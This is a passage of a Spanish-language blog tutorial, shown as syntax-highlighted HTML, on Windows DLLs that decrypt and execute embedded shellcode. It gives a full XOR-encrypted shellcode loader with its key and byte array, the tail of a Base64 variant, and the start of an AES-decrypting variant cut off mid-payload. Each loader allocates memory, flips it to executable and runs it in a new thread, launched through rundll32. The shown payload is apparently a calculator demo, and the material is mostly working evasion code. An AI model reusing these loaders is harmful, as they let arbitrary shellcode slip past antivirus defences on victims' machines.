	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">DecodeBase64</span><span class="p">((</span><span class="k">const</span> <span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>La ejecución del proceso:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe base_injection_exec.dll,f0ns1
</code></pre></div></div>

<h2 id="dll-calc-shellcode-encriptacion-xor">DLL calc shellcode Encriptacion XOR</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>


<span class="kt">void</span> <span class="n">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
	
	<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
		<span class="n">j</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
	
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>	
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">calc_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x21</span> <span class="p">};</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"y__modaba!!!"</span><span class="p">;</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>La ejecución del proceso:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe base_injection_exec.dll,f0ns1
</code></pre></div></div>
<p><img src="/assets/images/xor_dll_encryption.png" alt="xor_dll_encription" /></p>

<h2 id="dll-calc-shellcode-encriptacion-aes">DLL calc shellcode Encriptacion AES</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>

<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>

<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
		<span class="n">DWORD</span> <span class="o">*</span> <span class="n">pointer_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">payload_len</span><span class="p">;</span> 
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">pointer_len</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>  
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
	
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>	
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">calc_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span 